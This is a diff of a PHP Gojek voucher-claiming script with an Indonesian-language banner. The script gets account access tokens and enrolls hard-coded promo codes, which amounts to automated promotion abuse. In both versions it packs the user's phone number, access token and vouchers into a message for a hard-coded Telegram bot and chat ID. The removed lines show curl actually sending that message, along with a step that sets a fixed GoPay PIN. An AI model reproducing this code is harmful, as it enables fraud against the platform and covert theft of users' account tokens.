@@ -1,11 +1,20 @@
 <?php
 date_default_timezone_set('Asia/Jakarta');
 include "function1.php";
-echo color("nevy"," ===================================\n");
-echo color("yellow"," Klaim Voucher 20+10\n");
-echo color("green"," NANDARA SCRIPT GOFOOD\n");
-echo color("blue"," Time    : ".date('[d-m-Y] [H:i:s]')."	\n");
-echo color("nevy"," ===================================\n");
+echo "\e[95m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
+echo "\e[96m_________________   WARNING !!!!!!!!  _________________ \n";
+echo "\e[96m          INI SCRIB GOJEK INI GRATIS BRO                \n";
+echo "\e[96m           JADI GUNAKANLAH DENGAN BIJAK                 \n";
+echo "\e[96m          SCRIB INI TIDAK DI JUAL BELIKAN               \n";
+echo "\e[96m                             \n";
+echo "\e[96m                    Nandara Oficial                       \n";
+echo "\e[96m       BIAR BISA MAKIN SEMANGAT BIKIN KONTENNYA         \n";
+echo "\e[96m ********\e[95m".date('[d-m-Y] [H:i:s]')."\e[96m********\n";
+echo "\e[95m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
+echo "\e[96m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
+echo "\e[93m            \e[96m BERDOA DULU SEBELUM CLAIM \e[93m \n";
+echo "\e[96m  ==============================================\n";
+echo "\e[96m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
 
 // function change(){
         $nama = nama();
@@ -50,8 +59,8 @@ echo color("nevy"," ===================================\n");
         $uuid = getStr('"resource_owner_id":',',',$verif);
         echo color("nevy","+] Your access token : ".$token."\n\n");
         save("token.txt",$token);
-        echo color("nevy","\n===========(REDEEM VOUCHER)===========");
-        echo "\n".color("nevy","!] GOFOOD");
+        echo color("nevy","\n===========(SUROBOYO LOSST REWEL PEGAT)===========");
+        echo "\n".color("nevy","!] GOFOOD1");
         echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
@@ -65,7 +74,7 @@ echo color("nevy"," ===================================\n");
         }else{
         echo "\n".color("red","+] Message: ".$message);
 	gocar:
-        echo "\n".color("nevy","!] GOFOOD LAGI ");
+        echo "\n".color("nevy","!] GOFOOD 2 ");
         echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
@@ -79,13 +88,13 @@ echo color("nevy"," ===================================\n");
         }else{
         echo "\n".color("red","+] Message: ".$message);
         gofood:
-        echo "\n".color("nevy","!] GOFOOD");
+        echo "\n".color("nevy","!] GOFOOD3");
         echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
         sleep(10);
         }
-        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD0607"}');
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD0607"}');
         $message = fetch_value($code1,'"message":"','"');
         echo "\n".color("green","+] Message: ".$message);
         sleep(2);
@@ -115,47 +124,19 @@ echo color("nevy"," ===================================\n");
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $TOKEN  = "1338099497:AAFtktzWyqJ6x6YPGSmkc00E1fd-81_KB3k";
-      	$chatid = "746297056";
-      	$pesan 	= "[+] Gojek Account Info Makanbro [+]\n\n".$nohp."\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
-      	$method	= "sendMessage";
-      	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
-      	$post = [
-      		'chat_id' => $chatid,
+	$chatid = "746297056";
+	$pesan 	= "[+] Gojek Account Info Makanbro [+]\n\n".$nohp."\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
+	$method	= "sendMessage";
+	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+	$post = [
+ 		'chat_id' => $chatid,
                 'text' => $pesan
         	];
                 $header = [
                 "X-Requested-With: XMLHttpRequest",
                 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                         ];
-                                        $ch = curl_init();
-                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                                        curl_setopt($ch, CURLOPT_URL, $url);
-                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
-                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-                                        $datas = curl_exec($ch);
-                                        $error = curl_error($ch);
-                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-                                        curl_close($ch);
-                                        $debug['text'] = $pesan;
-                                        $debug['respon'] = json_decode($datas, true);
-         setpin:
-         echo "\n".color("purple","SET PIN GOPAY SEKALIAN ? !!!: Y/N ");
-         $pilih1 = trim(fgets(STDIN));
-         if($pilih1 == "y" || $pilih1 == "Y"){
-         //if($pilih1 == "y" && strpos($no, "628")){
-         echo color("nevy","▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN GOPAY = 112233 ▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
-         $data2 = '{"pin":"112233"}';
-         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
-         echo "OTP PIN 6 digit : ";
-         $otpsetpin = trim(fgets(STDIN));
-         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
-         echo $verifotpsetpin;
-         }else if($pilih1 == "n" || $pilih1 == "N"){
-         die();
-         }else{
-         echo color("red","-] GAGAL!!!\n");
-         }
+                                        
          }
          }
          }else{
